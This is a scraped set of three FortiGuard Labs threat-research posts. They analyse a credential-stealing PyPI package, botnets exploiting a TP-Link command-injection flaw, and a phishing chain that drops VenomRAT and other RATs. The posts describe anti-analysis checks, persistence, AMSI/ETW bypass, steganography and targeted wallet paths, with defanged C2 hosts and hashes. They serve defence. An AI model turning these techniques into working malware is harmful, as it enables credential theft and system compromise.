    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms where PyPI packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, etc.Severity level:High Vigilance is paramount in cybersecurity, especially when it comes to understanding and dissecting potentially malicious code. In this blog post, we'll delve into a piece of code designed (discordpy_bypass-1.7 ) to extract sensitive data from user systems. We'll analyze its components, functions, and methodologies to understand its purpose and approach. FortiGuard Labs uses a proprietary, AI-driven OSS malware detection system to hunt for and monitor threats. Using this approach on the Python Package Index (PyPI) supply chain platform, we unearthed a malicious PyPI package named discordpy_bypass-1.7, published on March 10, 2024, and detected on March 12, 2024. This code aims to covertly extract sensitive information from unsuspecting victims using a blend of persistence techniques, browser data extraction, and token harvesting. Understanding the origins and propagation methods of malicious code is paramount in its analysis. Authored by theaos, the author produced seven versions of the package, including versions 1.1, 1.2, 1.3, 1.4, 1.5, 1.6, and 1.7. The upgrade-colored_0.0.1 also exhibits similar malicious content as discordpy_bypass, indicating a consistent behavior pattern across versions. \"discordpy_bypass-1.7\" highlights the sort of ongoing threats seen across the cybersecurity landscape. This PyPI package version exhibits similar malicious behavior to previous malicious packages, focusing on extracting sensitive data from user systems through obfuscated code and evasion techniques targeting analysis environments. The code employs various checks to detect debugging or analysis environments and terminates itself if detected, showcasing the author's effort to evade scrutiny. The code has three layers. The original Python code is encoded using base64 (the innermost layer). The encoded strings are then broken into separate pieces and encoded once again with some obfuscation techniques (intermediate layer). The obfuscated file is then compiled using pyinstaller into an exe (the last layer) put on a remote URL. The code in discordpy_bypass/discordpy_bypass.py fetches the code from the URL and runs it on the user's device. This underscores the critical need for vigilance and proactive measures to effectively detect and mitigate cybersecurity threats. One of the first lines of defense code developers use against reverse engineering is detecting debugging or analysis environments. The code segment employs multiple techniques, listed below, to identify such environments and terminate the program’s “self-destruct” if detected. Block listed Processes: These iterate over the running processes and terminates them if their names match those in the blocked process list (“blacklistedProcesses”). These processes include debugging tools like Wireshark, OllyDbg, and IDA64 Network-related Checks: Compares system IP and MAC addresses against block lists (“blackListedIPS”, “blackListedMacs”). If the IP or MAC address is found in a block list, it returns “True,” indicating a debugging environment. System-related Checks: Compares system username, hostname, and hardware ID against block lists. (“blackListedUsers,” “blackListedPCNames,” and “blackListedHWIDS”) The code initializes a number of variables and sets up Socket.IO events to handle connections, disconnections, frame adjustments, and more. It enables remote control and monitoring of a system, facilitating actions such as directory navigation, file operations, and command execution. Several functions handle commands received over Socket.IO, executing various actions based on the command received. These actions include listing directory contents, sending files to the server, displaying alerts, listing processes, terminating processes, gathering system information, and more. Browser Data Extraction and Token Harvesting: The code's core functionality revolves around extracting sensitive information from browsers and harvesting authentication tokens, particularly from Discord. Browser Data Extraction: It utilizes techniques to extract data such as login credentials, cookies, web history, and more from various browsers. Token Harvesting: This process also decrypts and validates authentication tokens extracted from files, particularly Discord tokens, before uploading them to a remote server. Our investigation into the \"discordpy_bypass-1.7\" code has uncovered a clever and sneaky cyber threat to secretly steal important information from people's computers. What makes this code especially dangerous is how it tries to trick computer systems and experts who attempt to analyze it. It's like a master of disguise that can escape from being caught. This discovery reminds us that the internet isn't always a safe place. We need to stay alert to protect ourselves from such threats. Understanding them helps us build stronger defenses and stay safe in our digital world. By working together and staying cautious, we can keep our personal information and digital lives secure. FortiGuard AntiVirusdetects the malicious files identified in this report as upgrade-colored-0.0.1/colored/call.py:Python/Agent.COL!trupgrade-colored-0.0.1/colored_payload:Python/Agent.0337!trdiscordpy_bypass-1.0/discordpy_bypass/discordpy_bypass.py:Python/Disco.BYP!tr.dldrdiscordpy_bypass-1.1/discordpy_bypass/discordpy_bypass.py:Python/Disco.BYP!tr.dldrdiscordpy_bypass-1.2/discordpy_bypass/discordpy_bypass.py:Python/Disco.BYP!tr.dldrdiscordpy_bypass-1.3/discordpy_bypass/discordpy_bypass.py:Python/Disco.BYP!tr.dldrdiscordpy_bypass-1.4/discordpy_bypass/discordpy_bypass.py:Python/Disco.BYP!tr.dldrdiscordpy_bypass-1.5/discordpy_bypass/discordpy_bypass.py:Python/Disco.BYP!tr.dldrdiscordpy_bypass-1.6/discordpy_bypass/discordpy_bypass.py:Python/Disco.BYP!tr.dldrdiscordpy_bypass-1.7/discordpy_bypass/discordpy_bypass.py:Python/Disco.BYP!tr.dldrdiscordpy_bypass-1.7/discordpy_bypass/discordpy_bypass_payload.exe:Python/Agent.514A!trdiscordpy_bypass-1.7/discordpy_bypass/discordpy_bypass_python.py:Python/Agent.C77E!trdiscordpy_bypass-1.6/discordpy_bypass/discordpy_bypass_payload.py:Python/Agent.7684!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. File Hash (sha256) Detection upgrade-colored-0.0.1/colored/call.py ba2ceb9b1c6942617e4aaf76f12674acec0f072fde85249ebb7f0255b0681d8a Python/Agent.COL!tr upgrade-colored-0.0.1/colored_payload 21ce98a759d413a94487d76b4a37574787bba4695bde5444909f85c40b6a96dd Python/Agent.0337!tr discordpy_bypass-1.0/discordpy_bypass/discordpy_bypass.py 3428cfe2de2d415fbdb74b6d099af2061b8af2b21c432ed28b95f360090c80a2 Python/Disco.BYP!tr.dldr discordpy_bypass-1.1/discordpy_bypass/discordpy_bypass.py 3818b238229a40c64dd1cf07d064d5f6580d1887113691cdae23b55364ce572e Python/Disco.BYP!tr.dldr discordpy_bypass-1.2/discordpy_bypass/discordpy_bypass.py 49e74d6ee9ff330db385ac50c398b31ff96bdc88631a3ba4231c9cb11b91f91b Python/Disco.BYP!tr.dldr discordpy_bypass-1.3/discordpy_bypass/discordpy_bypass.py 6259496c7bf20f7b1cca959cd2807538f7e1f735a5bdef487de31c6f7c535645 Python/Disco.BYP!tr.dldr discordpy_bypass-1.4/discordpy_bypass/discordpy_bypass.py 66776b62992ab3a9801293852113e882822bb12cba4d8e89104aa60fbf83ee6d Python/Disco.BYP!tr.dldr discordpy_bypass-1.5/discordpy_bypass/discordpy_bypass.py 164f75859cbfe3d1dd78304de69d6d969df7f681a93b95162c98644425a9c4d2 Python/Disco.BYP!tr.dldr discordpy_bypass-1.6/discordpy_bypass/discordpy_bypass.py 1ebdd85a61edb7dde0e2ab59eb58325afd271cff3d364be95c142ed6fa312fae Python/Disco.BYP!tr.dldr discordpy_bypass-1.7/discordpy_bypass/discordpy_bypass.py 31c1c3530655fb6da70368fd6c462893ff1b85feda7e5ecbdd9c5ec600e4edb1 Python/Disco.BYP!tr.dldr discordpy_bypass-1.7/discordpy_bypass/discordpy_bypass_payload.exe 8fd185a5499d728eef4cd181477b0720a60c8be143ff2628941bb2a5985b1f73 Python/Agent.514A!tr discordpy_bypass-1.7/discordpy_bypass/discordpy_bypass_python.py d937aaf9f8a35687a5397aa9a657094c53553afba15953bc8c75fc9955a82b4c Python/Agent.C77E!tr discordpy_bypass-1.6/discordpy_bypass/discordpy_bypass_payload.py e6ccaa47337109d0bec65c573c9d6956e30c893e6bee5fc3bd6ab19f26ba558d Python/Agent.7684!tr malicious FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/unraveling-cyber-threats-insights-from-code-analysis"
  },
  {
    "title": "Botnets Continue Exploiting CVE-2023-1389 for Wide-Scale Spread",
    "content": "FortiGuard Labs Threat Research Affected Platforms:TP-Link Archer AX21 (AX1800) Version 1.1.4 Build 20230219 or priorImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High Last year, a command injection vulnerability,CVE-2023-1389, was disclosed and a fix developed for the web management interface of the TP-Link Archer AX21 (AX1800). FortiGuard Labs has developed an IPS signature to tackle this issue. Recently, we observed multiple attacks focusing on this year-old vulnerability, spotlighting botnets like Moobot, Miori, the Golang-based agent “AGoent,” and the Gafgyt Variant. Peaks caused by these threats are evident in the following figure. This article will explore their infection traffic patterns and offer insights into these botnets. This is an unauthenticated command injection vulnerability in the “locale” API available via the web management interface. Users query the specified form “country” and conduct a “write” operation, which is handled by the “set_country” function. It calls the “merge_config_by_country” function and concatenates the argument of the specified form “country” into a command string, which is executed by the “popen” function. Since the “country” field won’t be emptied, the attacker can achieve command injection. AGoent is a Golang-based agent bot. It first fetches the script file ”exec.sh“ from ”hxxp://5[.]10[.]249[.]153,” which retrieves the ELF files of different Linux-based architectures. After downloading the ELF files, the script will attempt to execute each file to find the appropriate architecture and remove each file to erase intrusion traces. The following analysis will focus on the executed file designed for the”386” architecture. There are two primary behaviors. The first is to create the host username and password using random characters. After user creation, the malware establishes a connection with the C&C (command and control) server and passes on the credentials just created by the malware. Gafgyt, also known as BASHLITE, is malware that infects Linux architecture operating systems to launch a DDoS (distributed denial of service) attack. In this variant, the bot downloads the script file “bins.sh” from “hxxp://195[.]62[.]32[.]227” and then executes the script. Gafgyt retrieves Linux architecture execution files with the prefix filename “rebirth.” We will next focus on “rebirth.x86.” Gafgyt gets the compromised target IP and architecture information, which it concatenates into a string that is part of its initial connection message. After establishing a connection with its C&C server, the malware receives a continuous \"PING\" command from the server to ensure persistence on the compromised target. The malware waits for any of the following commands from its C&C server. Each of them stands for a specified attack or function: Moobot fetches a script file from “hxxp://91[.]92[.]253[.]70.” The primary role of “1.sh” is to retrieve an ELF file with different architectures for further infection. The following analysis looks at the execution file designed for the “x86_64” architecture. Once executed, it removes itself and erases all traces from the compromised device. It then displays “0x00000e9” in the console and starts contacting the C2 server “fjsnsinfinsf[.]ngcv[.]top” Based on the XOR key “0xDEADBEEF” used for encoded strings and the hardcoded string “w5q6he3dbrsgmclkiu4to18npavj702f,” we can confirm this malware as Moobot. As the assembly indicates, a DDoS attack can be initiated on remote IPs via a C2 command. Additionally, there is an attack using a variant of Mirai. The exploitation process begins by downloading “tenda.sh” from “hxxp://94[.]156[.]8[.]244.” This script file then downloads an ELF execution file from the same IP address, available in 13 different architectures. The original execution file is compressed using UPX. This Mirai variant displays the message, “faggot got malware'd,” and monitors processes to terminate those associated with packet analysis tools. It then sends packets to the C2 server “45[.]155[.]91[.]135:21425” and awaits additional instructions for attacking. Below is an illustration of a DDoS attack scenario: The command and control (C2) server sends a packet with a length of 0x15, directing the endpoint to initiate an attack. The command specified is 0x01 for a Valve Source Engine (VSE) flood, with a duration of 60 seconds (0x3C), targeting a randomly selected victim's IP address and the port number 30129. Miori, another Mirai variant, shares similar modules. The batch script is fetched from “hxxp://185[.]224[.]128[.]34.” The downloader employs both HTTP and TFTP protocols to retrieve the ELF files. Once executed, Miori displays “your device just got infected to a bootnoot” in the console and sends \\x00\\x00 to the C2 server “rooty[.]cc” on TCP port 33335. The XOR key used for decoding configuration is 0xDFEDDEEF, and a hardcoded password list is included for the brute force attack function. The attacking command packet resembles those seen in previous Mirai variants. Condi’s downloader script was retrieved using multiple protocols to enhance the infection rate. Condi is executed with the parameter “work,” which is included in the first packet sent to the C2 server “bn[.]networkbn[.]click.” The command remains consistent withthe version distributed last year, retaining the function to prevent reboots by deleting binaries responsible for shutting down or rebooting the system. It also scans active processes and cross-references with predefined strings to terminate processes with matching names. Based on its selling page, Condi has updated its attacking methods, as shown below. As usual, botnets relentlessly target IoT vulnerabilities, continuously attempting to exploit them. Despite the discovery and provided remediation for the vulnerability CVE-2023-1389 last year, numerous campaigns still exploit it, resulting in significant peaks in our IPS telemetry. Users should be vigilant against DDoS botnets and promptly apply patches to safeguard their network environments from infection, preventing them from becoming bots for malicious threat actors. The malware described in this report is detected and blocked byFortiGuard Antivirusas: BASH/Mirai.AEH!tr.dldrELF/Mirai.A!trELF/Mirai.BSC!trELF/Mirai.CDB!trELF/Mirai.GG!trELF/Mirai.L!trELF/Moobot.A!trLinux/Mirai.BSC!trLinux/Mirai.CEA!trLinux/Mirai.CJS!trLinux/Mirai.F!trLinux/Mirai.IZ1H9!trELF/Mirai.AGIT!trELF/Gafgyt.BJ!trELF/Gafgyt.VE!trELF/Gafgyt.WN!tr.bdrLinux/Gafgyt.ARN!trLinux/Agent.AAO!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 servers and downloads URLs. FortiGuard Labs provides IPS signatures against attacks exploiting the following vulnerability: CVE-2023-1389: TP-Link.Archer.AX21.Unauthenticated.Command.Injection We also suggest that organizations go through Fortinet’sfree cybersecurity trainingmodule:Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. fjsnsinfinsf[.]ngcv[.]top45[.]155[.]91[.]135rooty[.]ccbn[.]networkbn[.]click5[.]10[.]249[.]153195[.]62[.]32[.]227 hxxp://91[.]92[.]253[.]70hxxp://94[.]156[.]8[.]244hxxp://103[.]188[.]244[.]189hxxp://185[.]224[.]128[.]34hxxp://5[.]10[.]249[.]153hxxp://195[.]62[.]32[.]227 6104674bfa58ac11c697062d6068c568384f13037d1a146dbe25cd001104ca8bf33a02781d60ca36f4ee56579c6d33846c2549ad7556bca499c73302cee17514d02381634921d92358577c106180eba766b98a520c907870898b2c32d7de45470a3fbc79e742354c8fc82830fc3426f7f8d3b900260c06aa58e53547b48feaa6475487bf7b96fe3da321dac0b5f59231651fc3d71f86bf9580bfa77e59b0f2c8a3e8493f2fb38b7f2ba309809577281d3cc25bee9fb3b5c0053a6e89de1dbce75e6deba076cbe7b9833d0ddee7c8065e91d13f1fc2a5c7daf4db36da458d689a29ef4c5d9172b09d6abc08da800a5a09b460b98aaadf1aa29edda81300fcc609e7af5f1d5d68f75ee03a37ee8016695e35edaae528cdba4ab7b9a90570a1e4beb45906c711ed4f109a10cfaffa0b4c18e56c6f6ddc8d100c87e0a0349a30293de9e8fc16c586f51eb2f86db5a60e54b46d66275fdd6df8fb72e96e50014a1290b731fe97dc723d0d5a51fe8203b33f16a51183b3dab4c9c8ee7bd304462ad1921ffc3c457eb84aa36cd4bc7f3d0dc9a6b8079d63c2bab03c3a646906152876c0d8b4d8950ec1a3f812af69d261f452aae2b19d3bced8551f9178e40ca0c1bcf88562c9ad26ab3ad7d16ac43c9dcbf600d5319e5432d72dc684983cc5f64ff41e092b3a57ee4ecd64591616da6ce0cfb9f01930dbeb179f05e1dbbdbc918098ac092b3a57ee4ecd64591616da6ce0cfb9f01930dbeb179f05e1dbbdbc918098acc65f86d5917025a8674bf9758870decd923ea2662d6611a1365303f4fe55fa2665f64b270a10255db1e55a158a02829a3af982cbcd4b56f14e58132cbb45e6a9a383319a28d50e8c280646dc53a2f33fec62ad69ef4948dae76a4f1f6fe2f1597ef190f05fe9be5d7f38bdb556fffdb7d9b5633ddf60cc43b98c09887a292c497322da39ce05e7496fcaef6602a15266943a59a5027e5ea97344133d42e0f6e3a1c14e99cc8490a4d503ffd660e2d881fa5d766a4288eea328f73bd8ee99078da7d3ffbb3edff1956d7422dd04305d8c3ac16418e2eb190ed9a08a1c275c5e8e1427deedaafd5345aa3c41d39b14b23a454ed894c73f3c9224cd0b51c88afcfaf97c9802324eeb0ebdfc15ce3e390c8cca5a9062c3348f7d2b5b00d1efa495083307e4d1daefca1eeb1ee4a6dea7738594076aa04f3e7e470a8b2ae32b9e489386fe87891311228b58a606114a2d41d94b520c5c4be6ff6bc0add45f5b6250efb9962c3e066904cf8df05f60b9bd21d979466aca64596d2b7557be7fa4358c4da48807aaa7be63c41bbabcf55d40cba416bc23432f247e4038ed0cd32fd055194119530c4dba8a53ba081094ca163f28a51bd37c6ee40b4aa55097939ec1df382be7481bfec8fcbb370afa00e9befa97000e7aa987a17cd6c48fc9f2d0b60110b605570db3158ba355552b5b638e7df4b0888d56d206004d9af6901c4770c75f0dbf4c327df0159305ffc9776ad2fbdd655fe513712f75e360e211aa6686f69aae2d6b41150d61b828368847a0eba51d4562fa2bae4478c10940f5e3e3e46c6b581adb7645ca54dbc3a043ee39a09037a7b5f572c1b8c137cb0c751b26ff9ebd18753e0c31c2100889f0e085ba03eb1c616dcc50606d9733574b68e75be2ee7a123a392cfa9114daeab28976f5ce740da4288d6ac516b5afbf1ea17e28eaada18317c084d08450a220fe7f38ce6b1a767b2e8776f8f4a436b84b912476b00cbc94c9297951a48fcc0f22dac94da599bc2651c757d27cb94c9de16d00ea5af04ffdcfaa03f99233d8aecc17098833d82860d68c12440c5ff7e898b50891cf65bf045b8b9f7bb69e4450d49eb6197722b9b58a8f0e7af479640ea6f666553db4da96c8ec9a54b0fef4bca739b47d943c295c766c7759d0f3a5a891585609019f421a6964f76f573dd50f41ee8dc4c5b29868807af6326faee92ad9ffaeba3dc5a3e220a88f3c07a6ece0adcbeca93fd6024d9f63a971c4aa732ec90930e386b5aa42deb408f0861891e49205fce2496cfe9a6c0cbf86f5d1c48bd88f9120631b1df19d69486f380f7f22482b17eab7343da36229a4e60b9f3938f7846002ff0fa28721dc3617731683a34eb7c8d9a688195d2db1efa8da3084edbe04f76cb0d0477e8061fab5ad856312040a78674932dcd08b6926a8cc8a5de91252c590b4f6ba9100bc0eb0bce4f5f7fc314fa820b4dee00db8d31892ec6fdb4fccca801a40d046d085e7c36ec4ada5f630c47b1ed418ceae077832d6fc2e7730af2715fb954dcc197f92fb6564575d7bd64958bc96be9e0c09d06fa19449a0ad3dc50f09ddb64e94d9808d5c3c414100abb60233614fcbad2e884c2fd851cb9d694186165a4fbfa195bd238473bfead86e74b796c4721d1f5281c284b96ff29d8806a82a6520396b1e21260b374a45ba703239bc29b1345dea89ad9d54db0b7f312aa95c69841a1a8f9ccb66f37f14b5cf2a77e9e8d47400bdec957d9f20729e5c81bfc78be6699d00adf4e8c070d2b955b23054e945c78267beb2ec9cc580130771200e5ea3fdae7846f75c7b65130e73bafda28f442913e403534cb91657c21c2426869f2f25f3558a2cdf5aca294254004954bb10d08a0ef0f913f3ddd1f8f3cc71f114dd12273047ec3eb4e1318c26ec7c10b77e5d631738da126880e248d7f54dfa5718F7faaadceebe69bec33096166a54ed9b593b1b690ba9594b4c353303f55101aae6d1df0621b10d051ebba4507ac3d14f4d206ab56bafbc3510db542d4c4470d94480d72a324f519d3a630bf2ef7b118f4e388c5bccdd0a5465bafd2253daa6194509e84a9abcb732f0ee90bf27dd300247b23b6dac9b41cd01f59d6384b5348a08166a0d2fe65a3ad8b289cb2714c3a150635e29664bff24e5befc6b48526899ed85c3e25bac63b7e232ac3cfd91116bf7c64f1c4c96b933d5715bbe055ffc89f0d62aec4a2a5353a6416bbd403969fc0617d08aeb8eb9e09de4d4068a2fd9f38cfdcaf4611fd855672ad561de196417deea97341f45efd02e97e26d4674291de73bbef9c7fcaf610c858be52a375b517bc62fd7e05dd867f928cd353536de16c192146c8311694342f73a19cfe69ecc53f3f1d6cab006526d2daa5134846357ab5ee18fd3df5a2d7f2d84c75b33fd2f73b76c8e0d2df278d9ded40943d16911ef30bd34f8c11e042e2600c62cf702515c94290207cf72fad1ec0d277221bb700571c16d0f2d0267b354f81fdbfb49738f3cb867371b9ef0d3ffe1020fb9f9cfbf5e6947f6829d17b8a8e5984366efcf5592d8f6bc7ec6d7e85b1872bebcb24a549d3aac3b42f702f29ab27c653c0f239a51601a6aeb50564beda614f8f1f33e botnets,cve FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/botnets-continue-exploiting-cve-2023-1389-for-wide-scale-spread"
  },
  {
    "title": "ScrubCrypt Deploys VenomRAT with an Arsenal of Plugins",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High Last year, FortiGuard Labs uncovered the 8220 Gang’s utilization ofScrubCryptto launch attacks targeting exploitable Oracle WebLogic Servers. ScrubCrypt has been described as an “antivirus evasion tool” that converts executables into undetectable batch files. It offers several options to manipulate malware, making it more challenging for antivirus products to detect. We recently discovered a threat actor distributing a phishing email containing malicious Scalable Vector Graphics (SVG) files. The email lures victims into clicking on an attachment, which downloads a ZIP file containing a Batch file obfuscated with the BatCloak tool. ScrubCrypt is then used to load the final payload, VenomRAT while maintaining a connection with a command and control (C2) server to install plugins on victims’ environments. The plugin files downloaded from the C2 server include VenomRAT version 6, Remcos, XWorm, NanoCore, and a stealer designed for specific crypto wallets. This article provides detailed insights into how the threat actor distributes VenomRAT and other plugins. The attacker initiates the attack by sending a phishing email stating that a shipment has been delivered. It also includes an attached invoice. The attachment is an SVG file named “INV0ICE_#TBSBVS0Y3BDSMMX.svg,” which contains embedded base64-encoded data. After victims open the SVG file, the ECMAScript creates a new blob and utilizes “window.URL.createObjectURL” to drop the decoded data as a ZIP file named “INV0ICE_#TBSBVS0Y3BDSMMX.zip.” The decompressed file is an obfuscated batch file that embeds its payload in the section “------BEGIN X509 CRL-----.” Based on the decoded comment in the first line, it is presumed that this batch file was created by the BatCloak tool, known for using heavily obfuscated batch files to deploy various malware families. BatCloak has been employed since 2022 to distribute malware while effectively evading detection by antivirus programs. The script initially copies a PowerShell execution file to “C:\\Users\\Public\\xkn.exe” and utilizes the copied file in later commands. It includes parameters in each command, “-WindowStyle hidden -inputformat none -outputformat none -NonInteractive,” to conceal its activity from the victim’s notice. It then decodes the malicious data and saves it as “pointer.png.” After hex-decoding, the result is saved as a “pointer” and moved to “C:\\Users\\Public\\Libraries\\pointer.cmd.” Upon executing “pointer.cmd,” it employs “cmd /c del” to delete all the files mentioned above. The “pointer.cmd” file serves as the ScrubCrypt batch file. It is deliberately cluttered with numerous junk strings to obscure readability. It incorporates two payloads encoded in Base64 format and employs AES-CBC decryption and GZIP compression to decompress them. It uses the PowerShell command “[System.Reflection.Assembly]::Load” to load the decrypted .NET assembly from a byte array, accessing its entry point method and invoking that method to initiate the execution of the assembly's code. The first payload serves two primary purposes: establishing persistence and loading the targeted malware. It determines whether the current user is part of the built-in Administrator role in a Windows operating system to configure its persistence settings. Additionally, it checks for the presence of any debugger. If found, it terminates the program to avoid detection. If the current user holds Administrator privileges, the program duplicates itself to “%AppData%/strt.cmd” and utilizes a PowerShell command to establish a scheduled task named “OneNote 83701.” This task triggers upon user login, executes “strt.cmd,” and operates with elevated privileges. Conversely, if the user lacks Administrator permissions, the program duplicates itself to the “StartUp” folder under the filename “strt.cmd.” Finally, it loads an assembly from an embedded resource named “P,” which contains a compressed assembly. It then invokes the entry point method of the loaded assembly to execute VenomRAT. The second payload from the ScrubCrypt batch file is for AMSI bypass and ETW bypass. VenomRAT is a remote access Trojan (RAT) first identified in 2020. It is a modified version of the well-known Quasar RAT and is distributed through malicious attachments in spam emails. Cybercriminals utilize it to gain unauthorized access and control over targeted systems. As with other RATs, VenomRAT enables attackers to manipulate compromised devices remotely, allowing them to execute various malicious activities without the victim's knowledge or consent. The fundamental configurations of VenomRAT are Base64-encoded, and AES-CBC encrypted. The decrypted data is shown in Figure 14. After completing environmental checks, VenomRAT initiates communication with its C2 server. The initial packet transmitted contains basic information about the victim, such as hardware specifications, username, operating system details, camera availability, execution path, foreground window name, and the name of the antivirus product installed. All C2 sessions are encrypted using the certificate specified in its configuration. By debugging the program, we extracted and decompressed the packets, revealing the keep-alive sessions established with the C2 server. While VenomRAT's primary program may appear straightforward, it maintains communication channels with the C2 server to acquire additional plugins for various activities. The assembly responsible for parsing packets from the server is outlined below. Upon receiving the “save_Plugin” directive from the server, it can decompress the data and save it to the registry. The “save_Plugin” data comprises a DLL file named “SendFile,” which can parse other “plug_in” files sent from the C2 server. If a plugin file with the same name is already in the victim’s environment, it deletes the existing file and creates a new one with the current data. After decompressing the “plug_in” packet data, it examines the “Filename” to determine which PowerShell command to employ. In Figure 21, once a “plugin” packet is received from the server, VenomRAT reads the registry to fetch the data for “SendFile.dll” and executes the payload contained within the plugin. In the following sections, we’ll elaborate on the plugins provided by the VenomRAT C2 server. The first plugin is embedded in ScrubCrypt and loads without landing any execution file in the victim’s environment, which perfectly hides its trace. The second payload from the ScrubCrypt Batch file is called “ScrubBypass.” This file is highly obfuscated to hide the code flow, functions, and strings. ScrubBypass’s main jobs are patching the AMSI scan buffer and EtwEventWrite to achieve AMSI and ETW bypass. The plugin VenomRAT is version 6.0.3. It has a Keylogger function and stores its C2 server information on the Pastebin website. It collects multiple data types, monitors the victim’s keyboard activities, and persistently sends stolen data to the C2 server. NanoCore is a notorious Remote Access Trojan (RAT) first discovered in 2013. It is known for its ability to remotely access and control a victim's computer, often without their knowledge. It continues to be relevant in the cybercrime world due to its source code being leaked and widely distributed in underground forums. This plugin is distributed to compromised devices by an obfuscated VBS file, shown in Figure 26. The script stores the data for the next stage on the website “hxxps://nanoshield[.]pro/files,” which also serves as a Crypter service provider. Initially, it retrieves a JPG file and decodes the target section using the reversed URL as a parameter. Although accessing the second URL, “hxxps://nanoshd[.]pro/files/new_image.jpg?14441723,” was unsuccessful, modifying the hostname to “nanoshield.pro” allowed us to access to a similar file, as seen in the first URL ”hxxps://nanoshield[.]pro/new_image2.jpg?166154725.” The JPG file employs steganographic methods to conceal code inside the picture, embedding malware data encoded in Base64 between the tags <<BASE64_START>> and <<BASE64_END>>. After decoding the JPG file, we obtained a .NET execution file. This file establishes persistence by configuring the registry key “HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” and checks for any virtual environments. It then downloads encoded data from the “nanoshield.pro/files” URL, reverses the data, replaces the specific string “DgTre,” and employs “RegAsm” to proxy the execution of NanoCore. XWorm is a RAT that spreads through removable drives like USB flash drives, infecting Windows systems. It can steal information or allow remote access. Figure 32 shows the plugin from VenomRAT’s C2 server with the filename “xwrm3.1.vbs” at the end of the packet. In addition to the VBS file, we retrieved another “plug_in” containing a batch script attempting to execute PowerShell commands. It downloads encoded data from “hxxps://kisanbethak[.]com/K/Universallsningen.lpk.” The next stage of the PowerShell code resides at the end of the decoded “Universallsningen.lpk” file. Despite containing numerous junk comments to obfuscate analysis, the PowerShell script uses the Process Hollowing technique to inject shellcode into a legitimate process. Following injection and environment verification, the shellcode executes the final malware, XWorm. In this attack scenario, GuLoader also deploys NanoCore and Remcos. Remcos is a Remote Access Trojan (RAT) first appearing in 2016. It is marketed as legitimate software for remote management but is often used maliciously. Remcos can give attackers complete control over an infected system, allowing them to capture keystrokes, screenshots, credentials, and other sensitive information. It is typically delivered via malicious documents or archive files and has been seen in phishing campaigns. This plugin was distributed from VenomRAT’s C2 using three methods: an obfuscated VBS script named “remcos.vbs”, ScrubCrypt, and Guloader PowerShell. The configuration for Remcos is RC4 encrypted in the“SETTINGS”resource, and the decrypted data is shown in Figure 42. This plugin is not only deployed via the obfuscated VBS script mentioned in the previous section but it is also embedded in a .NET execution file obfuscated using SmartAssembly. The .NET execution file decodes the next stage payload from the Resource file “ach” and writes the data into the memory. It then copies itself to the TEMP folder and sets this copied file to the scheduled task named “Nano.” This task repeats every 10 minutes after the first trigger. The next stage payload is more straightforward. It contains a hardcoded array for the malicious DLL file for stealing the victim’s sensitive data. The DLL file stores its configuration in Base64 encoded data, including the C2 hostname and the certificate to encrypt the communication. This DLL file keeps monitoring the user’s system and aims for specific crypto wallets, Foxmail, and telegram data by performing the following tasks repeatedly: 1.     Gathers details about the victim's environment, such as the PC name, username, antivirus software, disk information, and operating system version. 2.     Verifies the existence of the following paths: “\"%AppData%\\atomic\\Local Storage\\leveldb” “%AppData%\\Electrum\\wallets,” “%AppData%\\Ethereum\\keystore,” “%AppData%\\Exodus\\exodus.wallet,” “%AppData%\\com.liberty.jaxx\\IndexedDB,” “%AppData%\\Zcash,” “%AppData%\\Foxmail” and “%AppData%\\Telegram Desktop\\Telegram.exe”. 3.     Checks if the following registry exists: “Software\\Bitcoin\\Bitcoin-Qt,” “Software\\Dash\\Dash-Qt” and “Software\\Litecoin\\Litecoin-Qt. “ 4.     Once collected, the targeted data sends the data appended with the execution file path at the end to the C2 server, “markjohnhvncpure[.]duckdns.org.” This analysis reveals a sophisticated attack leveraging multiple layers of obfuscation and evasion techniques to distribute and execute VenomRAT via ScrubCrypt. The attackers employ a variety of methods, including phishing emails with malicious attachments, obfuscated script files, and Guloader PowerShell, to infiltrate and compromise victim systems. Furthermore, deploying plugins through different payloads highlights the versatility and adaptability of the attack campaign. The attackers’ ability to persist in the system, evade detection, and execute malicious payloads underscores the importance of robust cybersecurity measures and vigilant monitoring to mitigate such threats effectively. The malware described in this report is detected and blocked byFortiGuard Antivirusas: W32/Rescoms.U!trMSIL/NanoCore.K!trMSIL/Kryptik.TPQ!trMSIL/Kryptik.AKNE!trMSIL/Kryptik.AKCI!trMSIL/Kryptik.AHUA!trMSIL/GenericKD.70765425!trMSIL/GenericKD.61253965!trMSIL/Agent.VIC!trMSIL/Agent.SUB!trMSIL/Agent.PEP!tr.dldrMSIL/Agent.CTE!trMSIL/Agent.CFQ!trJS/Agent.PIJ!trBAT/Agent.B7E9!trBAT/Agent.ARX!tr.dldrVBS/Agent.IFT!trPowerShell/Agent.2C1B!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard 